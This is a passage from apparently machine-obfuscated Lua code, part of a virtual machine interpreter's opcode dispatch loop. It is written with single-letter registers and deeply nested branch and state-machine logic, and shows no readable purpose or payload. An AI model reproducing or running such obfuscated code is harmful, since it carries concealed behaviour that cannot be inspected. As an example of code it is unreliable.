q;w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];q=y[266]w[q]=w[q](r(w,q+1,y[607]))else local q;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];q=y[266]w[q]=w[q](r(w,q+1,y[607]))end;elseif 166>=z then local q;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];q=y[266]w[q]=w[q](r(w,q+1,y[607]))elseif z==167 then local q;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];q=y[266]w[q]=w[q](w[q+1])else a(c,e);end;elseif z<=171 then if 169>=z then local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))elseif z>170 then local a;local c;w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]={r({},1,y[607])};n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];c=y[266];a=w[c];for e=c+1,y[607]do t(a,w[e])end;else w[y[266]]={};end;elseif z<=172 then local a;local c;local e;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for q=e,y[185]do a=a+1;w[q]=c[a];end elseif z>173 then local a=y[266]local c={w[a](w[a+1])};local e=0;for q=a,y[185]do e=e+1;w[q]=c[e];end else local a;w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=y[185];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))end;elseif 180>=z then if z<=177 then if z<=175 then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for q=e,y[185]do a=a+1;w[q]=c[a];end elseif 176<z then w[y[266]][y[607]]=y[185];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;end;elseif 178>=z then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0<a then w[y[266]]=w[y[607]][y[185]];else c=nil end else if a~=3 then n=n+1;else y=f[n];end end else if a<=5 then if 5~=a then w[y[266]]=y[607];else n=n+1;end else if 7~=a then y=f[n];else w[y[266]]=y[607];end end end else if a<=11 then if a<=9 then if a~=9 then n=n+1;else y=f[n];end else if a<11 then w[y[266]]=y[607];else n=n+1;end end else if a<=13 then if a>12 then c=y[266]else y=f[n];end else if a==14 then w[c]=w[c](r(w,c+1,y[607]))else break end end end end a=a+1 end elseif z>179 then local a;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))else local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=false;n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];for c=y[266],y[607],1 do w[c]=nil;end;n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];a=y[266]w[a]=w[a](w[a+1])end;elseif 183>=z then if z<=181 then w[y[266]]=w[y[607]]%w[y[185]];elseif 183>z then w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if w[y[266]]then n=n+1;else n=y[607];end;else if(w[y[266]]<w[y[185]])then n=n+1;else n=y[607];end;end;elseif z<=184 then local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=false;n=n+1;y=f[n];a=y[266]w[a](w[a+1])elseif z<186 then local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a]()else h[y[607]]=w[y[266]];end;elseif 280>=z then if 233>=z then if(209>=z)then if(z==197 or z<197)then if z<=191 then if 188>=z then if z>187 then if(y[266]<w[y[185]])then n=n+1;else n=y[607];end;else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[266]]=w[y[607]];end else if a<3 then n=n+1;else y=f[n];end end else if a<=5 then if a>4 then n=n+1;else w[y[266]]=y[607];end else if 7>a then y=f[n];else w[y[266]]=y[607];end end end else if a<=11 then if a<=9 then if 9~=a then n=n+1;else y=f[n];end else if 11~=a then w[y[266]]=y[607];else n=n+1;end end else if a<=13 then if 12==a then y=f[n];else c=y[266]end else if 14<a then break else w[c]=w[c](r(w,c+1,y[607]))end end end end a=a+1 end end;elseif(189>=z)then local a=y[266]w[a]=w[a](r(w,(a+1),y[607]))elseif(z<191)then w[y[266]]=y[607];else local a,c,e,q=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0<a then e=nil else c=nil end else if a<=2 then q=nil else if 3<a then n=n+1;else w[y[266]]=h[y[607]];end end end else if a<=6 then if 6~=a then y=f[n];else w[y[266]]=h[y[607]];end else if a<=7 then n=n+1;else if a<9 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if a<=14 then if a<=11 then if 10<a then y=f[n];else n=n+1;end else if a<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if 13<a then y=f[n];else n=n+1;end end end else if a<=16 then if 15<a then e={w[q](w[q+1])};else q=y[266]end else if a<=17 then c=0;else if 18==a then for x=q,y[185]do c=c+1;w[x]=e[c];end else break end end end end end a=a+1 end end;elseif(194>=z)then if(192==z or 192>z)then local a=d[y[607]];local c={};local e={};for q=1,y[185]do n=(n+1);local x=f[n];if x[77]==32 then e[q-1]={w,x[607],nil,nil};else e[q-1]={h,x[607],nil};end;v[(#v+1)]=e;end;m(c,{['\95\95\105\110\100\101\120']=function(m,m)local m=e[m];return m[1][m[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(m,m,q)local e=e[m]e[1][e[2]]=q;end;});w[y[266]]=b(a,c,j);elseif(z<194)then w[y[266]]=h[y[607]];else local a,c,e,m=0 while true do if a<=10 then if a<=4 then if a<=1 then if 0<a then e=nil else c=nil end else if a<=2 then m=nil else if 3==a then w[y[266]]=h[y[607]];else n=n+1;end end end else if a<=7 then if a<=5 then y=f[n];else if 6==a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end else if a<=8 then y=f[n];else if a>9 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end end end end else if a<=16 then if a<=13 then if a<=11 then y=f[n];else if a==12 then w[y[266]]=h[y[607]];else n=n+1;end end else if a<=14 then y=f[n];else if 16~=a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end else if a<=19 then if a<=17 then y=f[n];else if 19~=a then m=y[607];else e=y[185];end end else if a<=20 then c=k(w,g,m,e);else if a==21 then w[y[266]]=c;else break end end end end end a=a+1 end end;elseif(z<195 or z==195)then local a=y[266]w[a]=w[a](r(w,(a+1),p))elseif z==196 then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a~=1 then c=nil else w[y[266]]=j[y[607]];end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if a==4 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 6<a then w[y[266]]=h[y[607]];else y=f[n];end end end else if a<=11 then if a<=9 then if 8==a then n=n+1;else y=f[n];end else if 10<a then n=n+1;else w[y[266]]=w[y[607]][y[185]];end end else if a<=13 then if 12<a then c=y[266]else y=f[n];end else if 15~=a then w[c]=w[c](w[c+1])else break end end end end a=a+1 end else local a=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then w[y[266]]=w[y[607]]/y[185];else n=n+1;end else if a<=2 then y=f[n];else if a>3 then n=n+1;else w[y[266]]=w[y[607]]-w[y[185]];end end end else if a<=6 then if 5==a then y=f[n];else w[y[266]]=w[y[607]]/y[185];end else if a<=7 then n=n+1;else if 8==a then y=f[n];else w[y[266]]=w[y[607]]*y[185];end end end end else if a<=14 then if a<=11 then if 10<a then y=f[n];else n=n+1;end else if a<=12 then w[y[266]]=w[y[607]];else if a==13 then n=n+1;else y=f[n];end end end else if a<=16 then if 15==a then w[y[266]]=w[y[607]];else n=n+1;end else if a<=17 then y=f[n];else if a==18 then n=y[607];else break end end end end end a=a+1 end end;elseif(z<203 or z==203)then if(200>z or 200==z)then if(198>=z)then local a=y[266]w[a]=w[a](r(w,(a+1),y[607]))elseif 199<z then w[y[266]]=(w[y[607]]-w[y[185]]);else local a,c=0 while true do if(a<=10)then if(a<=4)then if a<=1 then if 0<a then w[y[266]]=j[y[607]];else c=nil end else if a<=2 then n=n+1;else if 4~=a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if(a<7 or a==7)then if(a==5 or a<5)then n=(n+1);else if 6<a then w[y[266]]=y[607];else y=f[n];end end else if(a<=8)then n=n+1;else if(a~=10)then y=f[n];else w[y[266]]=y[607];end end end end else if(a==15 or a<15)then if a<=12 then if 12>a then n=(n+1);else y=f[n];end else if(a==13 or a<13)then w[y[266]]=y[607];else if not(15==a)then n=(n+1);else y=f[n];end end end else if(a<=18)then if a<=16 then w[y[266]]=y[607];else if(a<18)then n=n+1;else y=f[n];end end else if(a==19 or a<19)then c=y[266]else if(21~=a)then w[c]=w[c](r(w,(c+1),y[607]))else break end end end end end a=a+1 end end;elseif(not(z~=201)or z<201)then local a,c=0 while true do if(a<=14)then if(a<=6)then if(a<=2)then if(a==0 or a<0)then c=nil else if 2~=a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end else if a<=4 then if not(a==4)then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if not(6==a)then n=(n+1);else y=f[n];end end end else if(a==10 or a<10)then if(a<=8)then if a>7 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if not(a==10)then y=f[n];else w[y[266]]=(w[y[607]]*y[185]);end end else if(a<12 or a==12)then if(12>a)then n=n+1;else y=f[n];end else if not(14==a)then w[y[266]]=(w[y[607]]+w[y[185]]);else n=(n+1);end end end end else if a<=22 then if(a<=18)then if(a<=16)then if(16>a)then y=f[n];else w[y[266]]=j[y[607]];end else if(18>a)then n=n+1;else y=f[n];end end else if(a<=20)then if(a~=20)then w[y[266]]=w[y[607]][y[185]];else n=(n+1);end else if 22~=a then y=f[n];else w[y[266]]=w[y[607]];end end end else if(a<=26)then if(a<=24)then if 24>a then n=(n+1);else y=f[n];end else if a==25 then w[y[266]]=w[y[607]]+w[y[185]];else n=n+1;end end else if(a<28 or a==28)then if 27<a then c=y[266]else y=f[n];end else if not(a==30)then w[c]=w[c](r(w,(c+1),y[607]))else break end end end end end a=a+1 end elseif not(z==203)then w[y[266]]=false;else local a,c=0 while true do if a<=8 then if(a<=3)then if(a<=1)then if(a==0)then c=nil else w[y[266]]=w[y[607]][w[y[185]]];end else if not(3==a)then n=(n+1);else y=f[n];end end else if a<=5 then if(a>4)then n=(n+1);else w[y[266]]=w[y[607]];end else if(a<6 or a==6)then y=f[n];else if not(a==8)then w[y[266]]=y[607];else n=(n+1);end end end end else if(a<13 or a==13)then if(a<=10)then if(9==a)then y=f[n];else w[y[266]]=y[607];end else if(a==11 or a<11)then n=(n+1);else if a>12 then w[y[266]]=y[607];else y=f[n];end end end else if a<=15 then if 15>a then n=(n+1);else y=f[n];end else if(a==16 or a<16)then c=y[266]else if 18>a then w[c]=w[c](r(w,(c+1),y[607]))else break end end end end end a=a+1 end end;elseif(206>=z)then if 204>=z then local a,c=0 while true do if a<=13 then if a<=6 then if a<=2 then if a<=0 then c=nil else if 2~=a then w[y[266]]={};else n=n+1;end end else if a<=4 then if a~=4 then y=f[n];else w[y[266]]=h[y[607]];end else if 6>a then n=n+1;else y=f[n];end end end else if a<=9 then if a<=7 then w[y[266]]=w[y[607]][y[185]];else if a~=9 then n=n+1;else y=f[n];end end else if a<=11 then if a~=11 then w[y[266]][y[607]]=w[y[185]];else n=n+1;end else if a~=13 then y=f[n];else w[y[266]]=j[y[607]];end end end end else if a<=20 then if a<=16 then if a<=14 then n=n+1;else if a~=16 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if a<=18 then if 17<a then y=f[n];else n=n+1;end else if a==19 then w[y[266]]=j[y[607]];else n=n+1;end end end else if a<=23 then if a<=21 then y=f[n];else if a~=23 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end else if a<=25 then if 25>a then y=f[n];else c=y[266]end else if a<27 then w[c]=w[c]()else break end end end end end a=a+1 end elseif not(z==206)then local a=y[266]local c={w[a](r(w,a+1,p))};local e=0;for m=a,y[185]do e=(e+1);w[m]=c[e];end else local a=0 while true do if a<=8 then if a<=3 then if a<=1 then if 1~=a then w={};else for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;end else if a~=3 then n=n+1;else y=f[n];end end else if a<=5 then if a<5 then w[y[266]]=h[y[607]];else n=n+1;end else if a<=6 then y=f[n];else if 7<a then n=n+1;else w[y[266]]=w[y[607]]+y[185];end end end end else if a<=12 then if a<=10 then if 10>a then y=f[n];else h[y[607]]=w[y[266]];end else if a>11 then y=f[n];else n=n+1;end end else if a<=14 then if a==13 then do return end;else n=n+1;end else if a<=15 then y=f[n];else if 16==a then do return end;else break end end end end end a=a+1 end end;elseif(z<=207)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if a<1 then c=nil else w[y[266]]=w[y[607]][y[185]];end else if a<3 then n=n+1;else y=f[n];end end else if a<=5 then if 4<a then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if a<=6 then y=f[n];else if 8>a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end end else if a<=13 then if a<=10 then if a<10 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if a<=11 then n=n+1;else if a<13 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if a<=15 then if a~=15 then n=n+1;else y=f[n];end else if a<=16 then c=y[266]else if 18~=a then w[c]=w[c](w[c+1])else break end end end end end a=a+1 end elseif(z>208)then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if a~=1 then c=nil else e=nil end else if a<=2 then m=nil else if 4~=a then w[y[266]]=h[y[607]];else n=n+1;end end end else if a<=6 then if a==5 then y=f[n];else w[y[266]]=h[y[607]];end else if a<=7 then n=n+1;else if a<9 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if a<=14 then if a<=11 then if 11~=a then n=n+1;else y=f[n];end else if a<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if 14>a then n=n+1;else y=f[n];end end end else if a<=16 then if a==15 then m=y[266]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if 18<a then break else for q=m,y[185]do c=c+1;w[q]=e[c];end end end end end end a=a+1 end else local a,c=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then w[y[266]]=h[y[607]];else c=nil end else if a<=2 then n=n+1;else if a>3 then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end else if a<=7 then if a<=5 then n=n+1;else if a<7 then y=f[n];else w[y[266]]=h[y[607]];end end else if a<=8 then n=n+1;else if 10~=a then y=f[n];else w[y[266]]=w[y[607]][w[y[185]]];end end end end else if a<=15 then if a<=12 then if 12~=a then n=n+1;else y=f[n];end else if a<=13 then w[y[266]]=h[y[607]];else if a~=15 then n=n+1;else y=f[n];end end end else if a<=18 then if a<=16 then w[y[266]]=w[y[607]][y[185]];else if 17<a then y=f[n];else n=n+1;end end else if a<=19 then c=y[266]else if a<21 then w[c]=w[c](r(w,c+1,y[607]))else break end end end end end a=a+1 end end;elseif(z<221 or z==221)then if 215>=z then if z<=212 then if(z<210 or z==210)then w[y[266]]=w[y[607]]+y[185];elseif 212>z then w[y[266]]=h[y[607]];else local a,c=0 while true do if a<=10 then if a<=4 then if a<=1 then if 0==a then c=nil else w={};end else if a<=2 then for e=0,u,1 do if e<o then w[e]=s[e+1];else break;end;end;else if 3<a then y=f[n];else n=n+1;end end end else if a<=7 then if a<=5 then w[y[266]]=h[y[607]];else if 6==a then n=n+1;else y=f[n];end end else if a<=8 then w[y[266]]=w[y[607]][y[185]];else if 10~=a then n=n+1;else y=f[n];end end end end else if a<=16 then if a<=13 then if a<=11 then w[y[266]]=h[y[607]];else if a~=13 then n=n+1;else y=f[n];end end else if a<=14 then w[y[266]]=h[y[607]];else if 16~=a then n=n+1;else y=f[n];end end end else if a<=19 then if a<=17 then w[y[266]]=w[y[607]][w[y[185]]];else if a~=19 then n=n+1;else y=f[n];end end else if a<=20 then c=y[266]else if a~=22 then w[c](w[c+1])else break end end end end end a=a+1 end end;elseif(213>=z)then local a,c,e=0 while true do if a<=24 then if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if a<2 then e=nil else w[y[266]]={};end end else if a<=3 then n=n+1;else if 4==a then y=f[n];else w[y[266]]=h[y[607]];end end end else if a<=8 then if a<=6 then n=n+1;else if a==7 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if a<=9 then n=n+1;else if a==10 then y=f[n];else w[y[266]]=h[y[607]];end end end end else if a<=17 then if a<=14 then if a<=12 then n=n+1;else if a~=14 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if a<=15 then n=n+1;else if a<17 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if a<=20 then if a<=18 then n=n+1;else if 20~=a then y=f[n];else w[y[266]]={};end end else if a<=22 then if a>21 then y=f[n];else n=n+1;end else if 23==a then w[y[266]]={};else n=n+1;end end end end end else if a<=37 then if a<=30 then if a<=27 then if a<=25 then y=f[n];else if 26<a then n=n+1;else w[y[266]]=h[y[607]];end end else if a<=28 then y=f[n];else if a<30 then w[y[266]][y[607]]=w[y[185]];else n=n+1;end end end else if a<=33 then if a<=31 then y=f[n];else if a<33 then w[y[266]]=h[y[607]];else n=n+1;end end else if a<=35 then if a<35 then y=f[n];else w[y[266]][y[607]]=w[y[185]];end else if a~=37 then n=n+1;else y=f[n];end end end end else if a<=43 then if a<=40 then if a<=38 then w[y[266]][y[607]]=w[y[185]];else if 39==a then n=n+1;else y=f[n];end end else if a<=41 then w[y[266]]={r({},1,y[607])};else if 43~=a then n=n+1;else y=f[n];end end end else if a<=46 then if a<=44 then w[y[266]]=w[y[607]];else if 45==a then n=n+1;else y=f[n];end end else if a<=48 then if 47==a then e=y[266];else c=w[e];end else if a==49 then for m=e+1,y[607]do t(c,w[m])end;else break end end end end end end a=a+1 end elseif(z>214)then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0==a then c=nil else e=nil end else if a<=2 then m=nil else if 3==a then w[y[266]]=h[y[607]];else n=n+1;end end end else if a<=6 then if 5==a then y=f[n];else w[y[266]]=h[y[607]];end else if a<=7 then n=n+1;else if 9~=a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if a<=14 then if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if a<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if a~=14 then n=n+1;else y=f[n];end end end else if a<=16 then if 16~=a then m=y[266]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if a~=19 then for q=m,y[185]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end else if w[y[266]]then n=n+1;else n=y[607];end;end;elseif(z<218 or z==218)then if z<=216 then local a=y[607];local c=y[185];local a=k(w,g,a,c);w[y[266]]=a;elseif(218~=z)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0==a then c=nil else w[y[266]]=w[y[607]];end else if a==2 then n=n+1;else y=f[n];end end else if a<=5 then if 4==a then w[y[266]]=y[607];else n=n+1;end else if 7>a then y=f[n];else w[y[266]]=y[607];end end end else if a<=11 then if a<=9 then if 8==a then n=n+1;else y=f[n];end else if 10<a then n=n+1;else w[y[266]]=y[607];end end else if a<=13 then if a~=13 then y=f[n];else c=y[266]end else if 15~=a then w[c]=w[c](r(w,c+1,y[607]))else break end end end end a=a+1 end else local a,c,e,m,q=0 while true do if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if a==1 then e,m=nil else q=nil end end else if a<=3 then w[y[266]]=j[y[607]];else if 5~=a then n=n+1;else y=f[n];end end end else if a<=8 then if a<=6 then w[y[266]]=w[y[607]];else if 8>a then n=n+1;else y=f[n];end end else if a<=9 then w[y[266]]=y[607];else if a~=11 then n=n+1;else y=f[n];end end end end else if a<=17 then if a<=14 then if a<=12 then w[y[266]]=y[607];else if a<14 then n=n+1;else y=f[n];end end else if a<=15 then w[y[266]]=y[607];else if a==16 then n=n+1;else y=f[n];end end end else if a<=20 then if a<=18 then q=y[266]else if a==19 then e,m=i(w[q](r(w,q+1,y[607])))else p=m+q-1 end end else if a<=21 then c=0;else if a>22 then break else for m=q,p do c=c+1;w[m]=e[c];end;end end end end end a=a+1 end end;elseif(219==z or 219>z)then local a=y[266]local c,e=i(w[a](r(w,(a+1),y[607])))p=e+a-1 local e=0;for m=a,p do e=(e+1);w[m]=c[e];end;elseif 220==z then local a=0 while true do if a<=6 then if a<=2 then if a<=0 then w[y[266]]=w[y[607]][y[185]];else if 2~=a then n=n+1;else y=f[n];end end else if a<=4 then if a<4 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if a>5 then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end else if a<=9 then if a<=7 then n=n+1;else if 9~=a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if a<=11 then if 11>a then n=n+1;else y=f[n];end else if a==12 then if w[y[266]]then n=n+1;else n=y[607];end;else break end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0==a then c=nil else w[y[266]]=h[y[607]];end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if 5~=a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if a>6 then w[y[266]]=y[607];else y=f[n];end end end else if a<=11 then if a<=9 then if 8<a then y=f[n];else n=n+1;end else if 10<a then n=n+1;else w[y[266]]=y[607];end end else if a<=13 then if 13~=a then y=f[n];else c=y[266]end else if 14<a then break else w[c]=w[c](r(w,c+1,y[607]))end end end end a=a+1 end end;elseif(z<=227)then if 224>=z then if(z==222 or z<222)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 0<a then w[y[266]]=w[y[607]][y[185]];else c=nil end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if a==4 then w[y[266]]=h[y[607]];else n=n+1;end else if a<=6 then y=f[n];else if 7<a then n=n+1;else w[y[266]]=w[y[607]][y[185]];end end end end else if a<=13 then if a<=10 then if 10>a then y=f[n];else w[y[266]]=y[607];end else if a<=11 then n=n+1;else if 13>a then y=f[n];else w[y[266]]=y[607];end end end else if a<=15 then if 15~=a then n=n+1;else y=f[n];end else if a<=16 then c=y[266]else if a==17 then w[c]=w[c](r(w,c+1,y[607]))else break end end end end end a=a+1 end elseif 223<z then w[y[266]]=#w[y[607]];else local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then c=nil else e=nil end else if a<=2 then m=nil else if 4>a then w[y[266]]=h[y[607]];else n=n+1;end end end else if a<=6 then if 5==a then y=f[n];else w[y[266]]=h[y[607]];end else if a<=7 then n=n+1;else if 9>a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if a<=14 then if a<=11 then if 10==a then n=n+1;else y=f[n];end else if a<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if 14~=a then n=n+1;else y=f[n];end end end else if a<=16 then if 16>a then m=y[266]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if 18<a then break else for q=m,y[185]do c=c+1;w[q]=e[c];end end end end end end a=a+1 end end;elseif z<=225 then local a=0 while true do if a<=14 then if a<=6 then if a<=2 then if a<=0 then w={};else if 2>a then for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;else n=n+1;end end else if a<=4 then if a>3 then w[y[266]]=h[y[607]];else y=f[n];end else if 5<a then y=f[n];else n=n+1;end end end else if a<=10 then if a<=8 then if a~=8 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 10>a then y=f[n];else w[y[266]]=h[y[607]];end end else if a<=12 then if 11<a then y=f[n];else n=n+1;end else if a<14 then w[y[266]]={};else n=n+1;end end end end else if a<=21 then if a<=17 then if a<=15 then y=f[n];else if a>16 then n=n+1;else w[y[266]]={};end end else if a<=19 then if a<19 then y=f[n];else w[y[266]][y[607]]=w[y[185]];end else if 21>a then n=n+1;else y=f[n];end end end else if a<=25 then if a<=23 then if a~=23 then w[y[266]]=j[y[607]];else n=n+1;end else if a==24 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if a<=27 then if a~=27 then n=n+1;else y=f[n];end else if a~=29 then if w[y[266]]then n=n+1;else n=y[607];end;else break end end end end end a=a+1 end elseif not(z~=226)then local a,c,e,m=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if a>0 then e=nil else c=nil end else if a>2 then w[y[266]]=h[y[607]];else m=nil end end else if a<=5 then if 5>a then n=n+1;else y=f[n];end else if 6==a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end else if a<=11 then if a<=9 then if 8==a then y=f[n];else w[y[266]]=h[y[607]];end else if a==10 then n=n+1;else y=f[n];end end else if a<=13 then if a>12 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if a<15 then y=f[n];else w[y[266]]=w[y[607]][w[y[185]]];end end end end else if a<=23 then if a<=19 then if a<=17 then if a~=17 then n=n+1;else y=f[n];end else if 19>a then w[y[266]]=h[y[607]];else n=n+1;end end else if a<=21 then if a~=21 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if 23~=a then n=n+1;else y=f[n];end end end else if a<=27 then if a<=25 then if a==24 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if a~=27 then y=f[n];else m=y[607];end end else if a<=29 then if a>28 then c=k(w,g,m,e);else e=y[185];end else if a<31 then w[y[266]]=c;else break end end end end end a=a+1 end else local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[266]]=w[y[607]][y[185]];end else if a<3 then n=n+1;else y=f[n];end end else if a<=5 then if 4<a then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if a<=6 then y=f[n];else if a==7 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end end else if a<=13 then if a<=10 then if 9<a then w[y[266]]=w[y[607]][y[185]];else y=f[n];end else if a<=11 then n=n+1;else if a~=13 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if a<=15 then 